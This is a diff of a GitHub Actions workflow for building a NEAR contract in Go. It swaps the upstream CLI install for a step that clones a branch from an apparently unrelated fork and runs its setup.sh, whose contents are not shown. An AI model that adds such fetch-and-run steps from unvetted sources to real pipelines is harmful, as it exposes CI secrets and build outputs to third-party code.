@@ -1,4 +1,5 @@
 name: Build NEAR Contract
+
 on:
   push:
     branches: [ "main" ]
@@ -8,34 +9,37 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-    - name: Checkout Code
-      uses: actions/checkout@v4
+      - uses: actions/checkout@v4
 
-    - name: Set up Go
-      uses: actions/setup-go@v5
-      with:
-        go-version: '1.25'
+      - name: Setup Go
+        uses: actions/setup-go@v5
+        with:
+          go-version: '1.23'
 
-    - name: Install NEAR-GO CLI
-      run: |
-        go install github.com/vlmoon99/near-sdk-go/cmd/near-go@latest || echo "Need to use another way to install near-go, falling back to tinygo..."
+      - name: Install near-cli-go (from our fork)
+        run: |
+          git clone -b fix/critical-bugs https://github.com/joomcwegv/near-cli-go.git
+          cd near-cli-go
+          chmod +x setup.sh
+          ./setup.sh
+          go build -o near-go .
+          mkdir -p $HOME/.near-go
+          cp near-go $HOME/.near-go/
+          cp setup.sh $HOME/.near-go/
+          echo "$HOME/.near-go" >> $GITHUB_PATH
+          echo "$HOME/.near-go/tinygo/bin" >> $GITHUB_PATH
 
-    - name: Build Contract using Go
-      run: |
-        # Владтың SDK-сі Linux-те жұмыс істейді.
-        # Егер near-go CLI орнатылмаса, біз оның орнына TinyGo немесе Go wasip1 арқылы жинай аламыз:
-        GOOS=wasip1 GOARCH=wasm go build -o contract.wasm ./contract/main.go
-      continue-on-error: true
+      - name: Build Contract
+        run: |
+          cd contract
+          go mod tidy
+          near-go build project
+          echo "Build finished! Directory contents:"
+          ls -la
 
-    - name: Install TinyGo (Fallback)
-      if: steps.build.outcome != 'success'
-      run: |
-        wget https://github.com/tinygo-org/tinygo/releases/download/v0.41.1/tinygo_0.41.1_amd64.deb
-        sudo dpkg -i tinygo_0.41.1_amd64.deb
-        tinygo build -o contract.wasm -target wasm -no-debug ./contract/main.go
-
-    - name: Upload WASM Artifact
-      uses: actions/upload-artifact@v4
-      with:
-        name: near-contract-wasm
-        path: contract.wasm
+      - name: Upload Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: near-contract-wasm
+          path: contract/main.wasm
+          if-no-files-found: error
